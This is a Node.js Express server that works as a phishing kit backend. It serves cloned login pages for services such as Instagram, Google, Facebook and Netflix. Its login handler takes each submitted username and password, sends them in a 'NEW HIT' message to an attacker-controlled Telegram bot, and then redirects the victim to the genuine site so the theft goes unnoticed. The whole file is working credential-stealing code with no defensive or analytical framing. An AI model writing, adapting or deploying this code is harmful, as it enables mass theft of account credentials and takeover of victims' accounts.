const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const redirectMap = {
    'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
    'Google': 'https://www.google.com', 'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com', 'Netflix': 'https://www.netflix.com'
};

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && redirectMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', `${service.toLowerCase()}.html`));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

app.post('/login-data', (req, res) => {
    const { username, password, service } = req.body;
    if (!username || !password || !service) return;

    const message = `💎✨ **!! NEW HIT !!** ✨💎\n▬▬▬▬▬▬▬▬▬▬▬▬\n🎯 **Service:** *${service}*\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n▬▬▬▬▬▬▬▬▬▬▬▬`;

    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID, text: message, parse_mode: 'Markdown'
    }).then(() => res.redirect(redirectMap[service]));
});

module.exports = app;